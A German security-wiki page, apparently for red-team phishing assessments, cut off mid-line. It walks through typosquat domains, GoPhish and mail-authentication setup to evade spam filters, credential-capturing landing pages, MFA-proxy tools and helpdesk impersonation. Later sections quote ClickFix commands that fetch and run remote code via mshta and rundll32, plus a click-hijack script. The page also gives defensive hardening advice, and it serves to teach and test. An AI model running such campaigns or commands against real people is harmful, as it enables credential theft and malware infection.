# Phishing-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Das Opfer erkunden
   1. Die **Opfer-Domain** auswählen.
   2. Eine grundlegende Web-Enumeration durchführen, **um nach Login-Portalen zu suchen**, die das Opfer verwendet, und **entscheiden**, welches davon du **imitieren** wirst.
   3. **OSINT** nutzen, um **E-Mail-Adressen zu finden**.
2. Die Umgebung vorbereiten
   1. Die **Domain kaufen**, die du für das Phishing-Assessment verwenden wirst
   2. Die zugehörigen Einträge des **E-Mail-Dienstes konfigurieren** (SPF, DMARC, DKIM, rDNS)
   3. Den VPS mit **gophish** konfigurieren
3. Die Kampagne vorbereiten
   1. Das **E-Mail-Template** vorbereiten
   2. Die **Webseite** zum Stehlen der Zugangsdaten vorbereiten
4. Die Kampagne starten!

## Ähnliche Domainnamen generieren oder eine vertrauenswürdige Domain kaufen

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält** ein wichtiges **Keyword** der ursprünglichen Domain (z. B. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Bindestrich im Subdomainnamen**: Den **Punkt durch einen Bindestrich ersetzen** (z. B. www-zelster.com).
- **Neue TLD**: Dieselbe Domain mit einer **neuen TLD** verwenden (z. B. zelster.org)
- **Homoglyph**: Einen Buchstaben im Domainnamen durch **ähnlich aussehende Buchstaben ersetzen** (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Vertauschung:** Zwei Buchstaben im Domainnamen **vertauschen** (z. B. zelsetr.com).
- **Singularisierung/Pluralisierung**: Am Ende des Domainnamens ein „s“ hinzufügen oder entfernen (z. B. zeltsers.com).
- **Auslassung**: Einen Buchstaben aus dem Domainnamen **entfernen** (z. B. zelser.com).
- **Wiederholung:** Einen Buchstaben im Domainnamen **wiederholen** (z. B. zeltsser.com).
- **Ersetzung**: Wie bei Homoglyph, aber weniger unauffällig. Einen Buchstaben im Domainnamen ersetzen, möglicherweise durch einen Buchstaben, der auf der Tastatur in der Nähe des ursprünglichen Buchstabens liegt (z. B. zektser.com).
- **Subdomain-Erstellung**: Einen **Punkt** in den Domainnamen einfügen (z. B. ze.lster.com).
- **Einfügung**: Einen Buchstaben in den Domainnamen **einfügen** (z. B. zerltser.com).
- **Fehlender Punkt**: Die TLD an den Domainnamen anhängen (z. B. zelstercom.com)

**Automatische Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webseiten**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass einige gespeicherte oder übertragene Bits aufgrund verschiedener Faktoren wie Sonneneruptionen, kosmischer Strahlung oder Hardwarefehlern automatisch kippen**.

Wird dieses Konzept **auf DNS-Anfragen angewendet**, kann es passieren, dass die **beim DNS-Server eingehende Domain** nicht mit der ursprünglich angefragten Domain übereinstimmt.

Zum Beispiel kann eine Änderung eines einzelnen Bits in der Domain „windows.com“ diese in „windnws.com“ ändern.

Angreifer können sich dies **zunutze machen, indem sie mehrere durch Bitflipping veränderte Domains registrieren**, die der Domain des Opfers ähneln. Sie wollen legitime Benutzer zu ihrer eigenen Infrastruktur umleiten.

Weitere Informationen findest du unter [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Eine vertrauenswürdige Domain kaufen

Unter [https://www.expireddomains.net/](https://www.expireddomains.net) kannst du nach einer abgelaufenen Domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die abgelaufene Domain, die du kaufen möchtest, **bereits eine gute SEO-Bewertung hat**, kannst du nachsehen, wie sie eingestuft wird bei:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mail-Adressen finden

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % kostenlos)
- [https://phonebook.cz/](https://phonebook.cz) (100 % kostenlos)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um weitere gültige E-Mail-Adressen **zu finden** oder bereits gefundene Adressen **zu überprüfen**, kannst du versuchen, sie über die SMTP-Server des Opfers per Brute Force zu ermitteln. [Hier erfährst du, wie du E-Mail-Adressen überprüfen/finden kannst](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Vergiss außerdem nicht: Wenn die Benutzer **ein Webportal für den Zugriff auf ihre E-Mails verwenden**, kannst du prüfen, ob es für **Username-Brute-Force** anfällig ist, und die Schwachstelle gegebenenfalls ausnutzen.

## GoPhish konfigurieren

### Installation

Du kannst es unter [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) herunterladen.

Lade es herunter, entpacke es nach `/opt/gophish` und führe `/opt/gophish/gophish` aus.\
In der Ausgabe wird dir ein Passwort für den Admin-Benutzer auf Port 3333 angezeigt. Rufe daher diesen Port auf und verwende die Zugangsdaten, um das Admin-Passwort zu ändern. Möglicherweise musst du diesen Port zu deinem lokalen Rechner tunneln:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfiguration

**TLS-Zertifikatskonfiguration**

Vor diesem Schritt solltest du die **Domain, die du verwenden möchtest, bereits gekauft haben**. Sie muss auf die **IP-Adresse des VPS** zeigen, auf dem du **gophish** konfigurierst.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Mail-Konfiguration**

Beginne mit der Installation: `apt-get install postfix`

Füge dann die Domain zu den folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in /etc/postfix/main.cf:**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Ändere schließlich die Dateien **`/etc/hostname`** und **`/etc/mailname`** so, dass sie deinen Domainnamen enthalten, und **starte deinen VPS neu.**

Erstelle nun einen **DNS-A-Record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS verweist, sowie einen **DNS-MX-Record**, der auf `mail.<domain>` verweist.

Testen wir nun den E-Mail-Versand:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish-Konfiguration**

Beende die Ausführung von Gophish und konfiguriere es.\
Ändere `/opt/gophish/config.json` wie folgt (beachte die Verwendung von https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish-Dienst konfigurieren**

Um den gophish-Dienst so einzurichten, dass er automatisch gestartet und als Dienst verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Schließe die Konfiguration des Dienstes ab und überprüfe ihn, indem du:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Mailserver und Domain konfigurieren

### Warten & seriös wirken

Je älter eine Domain ist, desto unwahrscheinlicher ist es, dass sie als Spam erkannt wird. Daher solltest du vor dem Phishing-Assessment so lange wie möglich warten (mindestens 1 Woche). Wenn du außerdem eine Seite zu einem reputationsstarken Bereich einrichtest, wird die erworbene Reputation besser sein.

Beachte, dass du alles jetzt konfigurieren kannst, auch wenn du eine Woche warten musst.

### Reverse-DNS-Eintrag (rDNS) konfigurieren

Lege einen rDNS- (PTR-)Eintrag an, der die IP-Adresse des VPS in den Domainnamen auflöst.

### Sender Policy Framework (SPF)-Eintrag

Du musst **einen SPF-Eintrag für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Richtlinie zu erstellen (verwende die IP-Adresse des VPS).

![SPF-Wizard-Formular zum Erstellen eines SPF-Eintrags für eine Phishing-Domain](<../../images/image (1037).png>)

Dies ist der Inhalt, der in einem TXT-Eintrag innerhalb der Domain festgelegt werden muss:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC)-Eintrag

Du musst **einen DMARC-Eintrag für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS-TXT-Eintrag erstellen, der auf den Hostnamen `_dmarc.<domain>` verweist und folgenden Inhalt hat:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Du musst **einen DKIM-Eintrag für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DKIM-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Du musst beide vom DKIM-Schlüssel generierten B64-Werte zusammenfügen:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testen Sie die Bewertung Ihrer E-Mail-Konfiguration

Das können Sie mit [https://www.mail-tester.com/](https://www.mail-tester.com) tun\
Rufen Sie einfach die Seite auf und senden Sie eine E-Mail an die dort angegebene Adresse:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Du kannst auch **deine E-Mail-Konfiguration überprüfen**, indem du eine E-Mail an `check-auth@verifier.port25.com` sendest und **die Antwort liest** (dafür musst du Port **25** öffnen und die Antwort in der Datei _/var/mail/root_ ansehen, wenn du die E-Mail als root sendest).\
Stelle sicher, dass du alle Tests bestehst:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Du könntest auch **eine Nachricht an ein Gmail-Konto unter deiner Kontrolle senden** und die **E-Mail-Header** in deinem Gmail-Posteingang überprüfen. `dkim=pass` sollte im Headerfeld `Authentication-Results` vorhanden sein.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Entfernen von der Spamhouse-Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann Ihnen anzeigen, ob Ihre Domain von Spamhouse blockiert wird. Sie können die Entfernung Ihrer Domain/IP-Adresse hier beantragen: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Entfernen von der Microsoft-Blacklist

​​Sie können die Entfernung Ihrer Domain/IP-Adresse hier beantragen: [https://sender.office.com/](https://sender.office.com).

## GoPhish-Kampagne erstellen und starten

### Versandprofil

- Legen Sie einen **Namen zur Identifizierung** des Absenderprofils fest.
- Entscheiden Sie, von welchem Konto Sie die Phishing-E-Mails versenden möchten. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Sie können Benutzername und Passwort leer lassen, aber aktivieren Sie unbedingt „Ignore Certificate Errors“.

![GoPhish-Kampagne erstellen und starten – Versandprofil: Sie können Benutzername und Passwort leer lassen, aber aktivieren Sie unbedingt „Ignore Certificate Errors“](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion „**Send Test Email**“ zu verwenden, um zu testen, ob alles funktioniert.\
> Ich empfehle, die Test-E-Mails an 10min-Mail-Adressen zu senden, um zu vermeiden, dass Sie bei den Tests auf eine Blacklist geraten.

### E-Mail-Vorlage

- Legen Sie einen **Namen zur Identifizierung** der Vorlage fest.
- Verfassen Sie dann einen **Betreff** (nichts Ungewöhnliches, sondern etwas, das Sie auch in einer normalen E-Mail erwarten würden).
- Stellen Sie sicher, dass „**Add Tracking Image**“ aktiviert ist.
- Verfassen Sie die **E-Mail-Vorlage** (Sie können Variablen verwenden, wie im folgenden Beispiel):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Beachte, dass es **zur Erhöhung der Glaubwürdigkeit der E-Mail** empfehlenswert ist, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existierende Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mail-Adressen** wie info@ex.com, press@ex.com oder public@ex.com, sende ihnen eine E-Mail und warte auf eine Antwort.
- Versuche, eine **entdeckte gültige** E-Mail-Adresse zu kontaktieren, und warte auf eine Antwort.

![Sending Profile - Email Template: Versuche, eine entdeckte gültige E-Mail-Adresse zu kontaktieren, und warte auf eine Antwort](<../../images/image (80).png>)

> [!TIP]
> Im Email Template können auch **Dateien zum Versand angehängt werden**. Wenn du mit speziell präparierten Dateien/Dokumenten auch NTLM-Challenges stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Gib einen **Namen** ein.
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Aktiviere **Capture Submitted Data** und **Capture Passwords**.
- Lege eine **Weiterleitung** fest.

![Email Template - Landing Page: Aktiviere Capture Submitted Data und Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite bearbeiten und lokal einige Tests durchführen (vielleicht mit einem Apache-Server), **bis dir das Ergebnis gefällt**. Füge dann diesen HTML-Code in das Feld ein.\
> Beachte: Wenn du für das HTML **statische Ressourcen** verwenden musst (vielleicht CSS- und JS-Dateien), kannst du sie unter _**/opt/gophish/static/endpoint**_ speichern und dann über _**/static/\<filename>**_ darauf zugreifen.

> [!TIP]
> Bei der Weiterleitung könntest du **Benutzer auf die legitime Hauptseite des Opfers weiterleiten** oder sie zum Beispiel auf _/static/migration.html_ weiterleiten, dort für 5 Sekunden ein **Ladekreissymbol (**[**https://loading.io/**](https://loading.io)**) anzeigen und anschließend mitteilen, dass der Vorgang erfolgreich war**.

### Users & Groups

- Gib einen Namen ein.
- **Importiere die Daten** (beachte, dass du für die Beispielvorlage den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst).

![Landing Page - Users & Groups: Importiere die Daten (beachte, dass du für die Beispielvorlage den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst)](<../../images/image (163).png>)

### Campaign

Erstelle schließlich eine Kampagne und wähle dafür einen Namen, das Email Template, die Landing Page, die URL, das Sending Profile und die Gruppe aus. Beachte, dass die URL der Link ist, der an die Opfer gesendet wird.

Beachte, dass du über das **Sending Profile eine Test-E-Mail senden kannst, um zu sehen, wie die fertige Phishing-E-Mail aussieht**:

![Users & Groups - Campaign: Beachte, dass du über das Sending Profile eine Test-E-Mail senden kannst, um zu sehen, wie die fertige Phishing-E-Mail aussieht](<../../images/image (192).png>)

Wenn alles bereit ist, starte einfach die Kampagne!

## Website Cloning

Wenn du die Webseite aus irgendeinem Grund klonen möchtest, sieh dir die folgende Seite an:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei manchen Phishing-Assessments (vor allem bei Red Teams) möchtest du vielleicht auch **Dateien mit irgendeiner Art von Backdoor versenden** (vielleicht ein C2 oder einfach etwas, das eine Authentifizierung auslöst).\
Auf der folgenden Seite findest du einige Beispiele:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich raffiniert, da du eine echte Webseite vortäuschst und die vom Benutzer eingegebenen Informationen sammelst. Wenn der Benutzer jedoch nicht das richtige Passwort eingegeben hat oder die gefälschte Anwendung mit 2FA konfiguriert ist, **reichen diese Informationen nicht aus, um dich als den getäuschten Benutzer auszugeben**.

Hier kommen Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) zum Einsatz. Mit diesem Tool kannst du einen MitM-ähnlichen Angriff durchführen. Grundsätzlich läuft der Angriff wie folgt ab:

1. Du **täuschst das Anmeldeformular** der echten Webseite vor.
2. Der Benutzer **sendet** seine **Anmeldedaten** an deine gefälschte Seite und das Tool sendet sie an die echte Webseite weiter und **prüft, ob die Anmeldedaten funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach. Sobald der **Benutzer den Code eingibt**, sendet das Tool ihn an die echte Webseite weiter.
4. Sobald der Benutzer authentifiziert ist, hast du als Angreifer **die Anmeldedaten, die 2FA, das Cookie und alle Informationen** aus sämtlichen Interaktionen abgefangen, während das Tool einen MitM-Angriff durchführt.

### Via VNC

Was wäre, wenn du das Opfer nicht auf eine **bösartige Seite mit demselben Aussehen wie das Original** schickst, sondern auf eine **VNC-Sitzung mit einem Browser, der mit der echten Webseite verbunden ist**? Du kannst sehen, was es tut, das Passwort, die verwendete MFA, die Cookies usw. stehlen...\
Das ist mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) möglich.<sup>[[3]](#references)[[4]](#references)</sup>

## Die Erkennung erkennen

Eine der besten Möglichkeiten herauszufinden, ob du aufgeflogen bist, ist natürlich, **deine Domain in Blacklists zu suchen**. Wenn sie dort auftaucht, wurde deine Domain offenbar als verdächtig eingestuft.\
Eine einfache Möglichkeit zu prüfen, ob deine Domain in einer Blacklist auftaucht, ist [https://malwareworld.com/](https://malwareworld.com).

Es gibt jedoch auch andere Möglichkeiten herauszufinden, ob das Opfer **aktiv nach verdächtigen Phishing-Aktivitäten in freier Wildbahn sucht**, wie hier beschrieben:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst **eine Domain mit einem sehr ähnlichen Namen wie der Domain des Opfers kaufen** und/oder **ein Zertifikat für eine Subdomain** einer von dir kontrollierten Domain **erstellen, die das Schlüsselwort** aus der Domain des Opfers **enthält**. Wenn das **Opfer** irgendeine Art von **DNS- oder HTTP-Interaktion** mit diesen Domains durchführt, weißt du, dass **es aktiv nach verdächtigen Domains sucht**, und musst besonders unauffällig vorgehen.<sup>[[2]](#references)</sup>

### Phishing bewerten

Verwende [**Phishious** ](https://github.com/Rices/Phishious), um zu bewerten, ob deine E-Mail im Spam-Ordner landet, blockiert wird oder erfolgreich ist.

## Kompromittierung der Identität durch direkten Kontakt (MFA-Reset beim Helpdesk)

Moderne Intrusion-Sets umgehen zunehmend E-Mail-Köder und **zielen direkt auf den Service-Desk- bzw. Identitätswiederherstellungsprozess**, um MFA zu umgehen. Der Angriff erfolgt vollständig „living-off-the-land“: Sobald der Operator gültige Anmeldedaten besitzt, bewegt er sich mit integrierten Admin-Tools weiter – Malware ist nicht erforderlich.<sup>[[6]](#references)</sup>

### Angriffsablauf
1. Aufklärung des Opfers
   * Sammle persönliche und geschäftliche Informationen von LinkedIn, aus Datenlecks, von öffentlichem GitHub usw.
   * Identifiziere besonders wichtige Identitäten (Führungskräfte, IT, Finanzabteilung) und ermittle den **genauen Helpdesk-Prozess** zum Zurücksetzen von Passwörtern bzw. MFA.
2. Social Engineering in Echtzeit
   * Kontaktiere den Helpdesk per Telefon, Teams oder Chat und gib dich als Zielperson aus (oft mit **gefälschter Anrufer-ID** oder **geklonter Stimme**).
   * Gib zuvor gesammelte personenbezogene Informationen an, um wissensbasierte Verifizierungsfragen zu bestehen.
   * Überzeuge den Mitarbeiter, das **MFA-Geheimnis zurückzusetzen** oder einen **SIM-Swap** für eine registrierte Mobilnummer durchzuführen.
3. Sofortige Aktionen nach dem Zugriff (in realen Fällen ≤60 Min.)
   * Sichere dir über ein beliebiges Web-SSO-Portal einen ersten Zugang.
   * Durchsuche AD / AzureAD mit integrierten Tools (keine Binärdateien werden abgelegt):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Laterale Bewegung mit **WMI**, **PsExec** oder legitimen **RMM**-Agents, die in der Umgebung bereits auf der Allowlist stehen.

### Erkennung & Eindämmung
* Behandelt die Wiederherstellung von Helpdesk-Identitäten als **privilegierten Vorgang** – verlangt eine zusätzliche Authentifizierung und die Genehmigung durch einen Manager.
* Setzt **Identity Threat Detection & Response (ITDR)**- / **UEBA**-Regeln ein, die bei Folgendem einen Alarm auslösen:  
  * MFA-Methode geändert + Authentifizierung von einem neuen Gerät / aus einer neuen Geo-Region.  
  * Unmittelbare Rechteausweitung desselben Principals (user-→-admin).  
* Zeichnet Helpdesk-Anrufe auf und verlangt vor jedem Zurücksetzen einen **Rückruf an eine bereits registrierte Nummer**.
* Implementiert **Just-In-Time (JIT) / Privileged Access**, damit Konten nach dem Zurücksetzen nicht automatisch Tokens mit hohen Berechtigungen erhalten.

---

## Täuschung im großen Maßstab – SEO Poisoning & „ClickFix“-Kampagnen
Commodity-Crews gleichen die Kosten aufwendiger Operationen mit Massenangriffen aus, bei denen **Suchmaschinen und Werbenetzwerke als Auslieferungskanal** dienen.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** bringt ein gefälschtes Ergebnis wie `chromium-update[.]site` an die Spitze der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage-Loader** herunter (häufig JS/HTA/ISO). Beispiele, die Unit 42 beobachtet hat:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies und Anmeldedatenbanken und lädt dann einen **Silent Loader** nach, der *in Echtzeit* entscheidet, ob Folgendes eingesetzt wird:
   * RAT (z. B. AsyncRAT, RustDesk)
   * Ransomware / Wiper
   * Persistenzkomponente (Registry-Run-Key + geplanter Task)

### Tipps zur Härtung
* Blockiert neu registrierte Domains und setzt **Advanced DNS / URL Filtering** sowohl für *Suchanzeigen* als auch für E-Mails durch.
* Beschränkt Softwareinstallationen auf signierte MSI- / Store-Pakete und unterbindet die Ausführung von `HTA`, `ISO`, `VBS` per Richtlinie.
* Überwacht untergeordnete Prozesse von Browsern, die Installer öffnen:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Suche nach LOLBins, die häufig von First-Stage-Loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### Hijacking von Klicks auf Download-Schaltflächen mit TDS-Übergabe
Einige gefälschte Softwareportale lassen den sichtbaren Download-`href` auf die **echte** GitHub-/Release-URL verweisen, hijacken aber die **erste** Nutzerinteraktion per JavaScript und leiten das Opfer stattdessen in eine **Traffic Distribution System (TDS)**-Kette weiter.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Key traits:
- Der Hook läuft normalerweise in der **Capture-Phase** (`true`) auf `document` und wird daher vor den Handlern der Website ausgeführt.
- Chrome verwendet oft `mousedown` statt `click`, damit die Weiterleitung an eine gültige **Nutzeraktion** gebunden bleibt und sich Popup-Blocker besser umgehen lassen.
- Manche Varianten öffnen vorab `about:blank` oder lösen Klicks auf synthetische `<a target="_blank">`-Elemente aus und weisen erst später die TDS-URL zu.
- Browserseitige Limits liegen häufig in `localStorage`. Dadurch kann der **erste Klick** zur Malware führen, während Aktualisierungen und Wiederholungsversuche auf den harmlos wirkenden sichtbaren Link zurückfallen.
- Die TDS kann nach Referrer, Einstiegsdomain, GEO, Browser-/Geräte-Fingerprint, VPN-/Rechenzentrumsprüfungen, Klickkontext und sitzungsbezogenen Zählern filtern. Dadurch sind Wiederholungen durch Analysten nicht deterministisch.

Ideen für Defender:
- Vergleicht das **angezeigte** `href` mit dem tatsächlichen Navigationsziel, das beim Klick erzeugt wird.
- Sucht nach `document.addEventListener(..., true)`-Handlern, die in Zusammenhang mit `window.open`, `about:blank` oder synthetischen Klicks auf Ankerelemente sowohl `preventDefault()` als auch `stopImmediatePropagation()` aufrufen.
- Behandelt Gruppen neu registrierter Software-Download-Domains, die alle dieselbe CloudFront-/JS-Stufe laden, als starkes Muster für SEO-Poisoning/TDS.

### ClickFix von gefälschten Verifizierungsseiten + wie Archive wirkende LOLBAS-Abrufe
Manche TDS-Zweige führen zu einer gefälschten Verifizierungsseite (im Stil von Cloudflare/IUAM), die das Opfer auffordert, eine vertrauenswürdige Windows-Binärdatei auszuführen, etwa:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notizen:
- `mshta.exe` führt das **HTA/VBScript am Anfang der Antwort** aus, selbst wenn die URL vorgibt, ein `.7z`-Archiv zu sein; angehängte Archivdaten können reine Ablenkung sein.
- Nachfolgende Stufen geben oft weiterhin einen falschen Dateityp vor (`.rtf` für PowerShell, `.asar` für Python, ZIPs mit aufgefüllten Binärdateien) und wechseln dann zu **manuellem PE-Mapping / In-Memory-Ausführung**.
- Wenn du auf eine dieser Angriffsketten reagierst, sichere **Netzwerkdaten und Arbeitsspeicher ab dem ersten erfolgreichen Lauf**: spätere Wiederholungen zeigen möglicherweise nur einen harmlosen Installer-/SFX-Ablauf oder schlagen fehl, weil die Payload- bzw. Schlüssel-Freigabe an die ursprüngliche TDS-Sitzung gebunden war.

### DLL-Auslieferung mit ClickFix-Taktiken (gefälschtes CERT-Update)
* Köder: geklonte nationale CERT-Warnung mit einem **Update**-Button, der schrittweise „Korrektur“-Anweisungen anzeigt. Opfer werden angewiesen, eine Batchdatei auszuführen, die eine DLL herunterlädt und sie über `rundll32` ausführt.<sup>[[12]](#references)</sup>
* Typische beobachtete Batch-Angriffskette:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
